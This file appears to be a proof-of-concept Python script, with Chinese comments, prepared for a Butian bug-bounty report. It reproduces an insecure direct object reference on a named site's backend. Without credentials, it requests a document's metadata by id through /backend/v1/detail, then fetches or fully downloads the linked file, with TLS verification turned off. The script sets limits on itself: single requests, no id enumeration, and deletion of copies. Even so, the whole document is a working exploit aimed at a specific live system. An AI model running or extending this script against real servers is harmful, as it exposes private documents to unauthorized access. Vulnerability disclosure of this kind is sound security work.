#!/usr/bin/env python3
"""
报告 B 最小复现脚本：info.sunoasis.com.cn 文档越权读取与本地文件验证
====================================================================
依据：butian-B-info-idor-files.md（补天 #64777 批次，2026-08-25~26 测试期）

用法：
  python3 poc_reproduce.py 19              # detail 越权读取（单条，打印元数据）
  python3 poc_reproduce.py 115 --range     # 受限 Range GET 验证（默认：只读响应头+前8字节）
  python3 poc_reproduce.py 115 --full --out /tmp/verify.pdf
                                           # 完整下载并校验 MD5/页数（验证后请立即删除副本）

纪律：
  - 无 Cookie / 无 Authorization / 无 Token（裸 urllib 请求）
  - 单条请求，不批量枚举（禁用 id 循环）
  - 默认不保存任何内容；--full 仅用于验收下载链路，验证后立即删除
  - 不输出完整 hash 文件名到报告（内部使用）
"""

import ssl, sys, os, hashlib, json, urllib.request, urllib.error

BASE = "https://info.sunoasis.com.cn"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def api(path, payload):
    req = urllib.request.Request(BASE + path,
        data=json.dumps(payload).encode(),
        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=20, context=CTX)
        return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    fid = int(sys.argv[1])
    mode = "--range"
    out = None
    if "--full" in sys.argv:
        mode = "--full"
        if "--out" in sys.argv:
            out = sys.argv[sys.argv.index("--out") + 1]

    # 步骤 1：detail 越权读取
    c, b = api("/backend/v1/detail", {"filesId": fid})
    print(f"[1] detail filesId={fid}: HTTP {c}")
    d = json.loads(b)
    data = d.get("data") or {}
    print(f"    title: {data.get('title')}")
    print(f"    fileNo: {data.get('fileNo')}")
    print(f"    isDownload: {data.get('isDownload')}")
    file_rel = data.get("file") or ""
    if not file_rel:
        print("    [注意] 当前 detail 响应不含 file 字段（部分文档直链已移除）")
        return
    fname = file_rel.split("/")[-1]
    print(f"    file: /backend/storage/files/<{fname[:8]}...>（hash 脱敏）")
    # detail 返回绝对 URL；兼容相对路径
    url = file_rel if file_rel.startswith("http") else BASE + file_rel

    # 步骤 2a：受限 Range GET（默认，不保存内容）
    if mode == "--range":
        req = urllib.request.Request(url, headers={"Range": "bytes=0-524287"})
        r = urllib.request.urlopen(req, timeout=20, context=CTX)
        head8 = r.read(8)
        print(f"[2] Range GET: HTTP {r.status}")
        for k in ("Content-Type", "Content-Range"):
            print(f"    {k}: {r.headers.get(k)}")
        print(f"    前8字节: {head8}")
        print("    内容: 未保存（仅验证响应特征）")
        return

    # 步骤 2b：完整下载（--full，验证后立即删除）
    if mode == "--full":
        if not out:
            print("--full 需要 --out 指定临时路径"); sys.exit(1)
        req = urllib.request.Request(url)
        r = urllib.request.urlopen(req, timeout=60, context=CTX)
        body = r.read()
        print(f"[2] 完整 GET: HTTP {r.status}, {len(body)}B")
        print(f"    Content-Type: {r.headers.get('Content-Type')}")
        open(out, "wb").write(body)
        md5 = hashlib.md5(body).hexdigest()
        print(f"[3] MD5: {md5}")
        print(f"    归档指纹比对: {md5 == '42108b1d1cd9175b4997d844e2a2ca63'}")
        print(f"    文件已保存至 {out} —— 验证完成后请立即删除（rm {out}）")

if __name__ == "__main__":
    main()
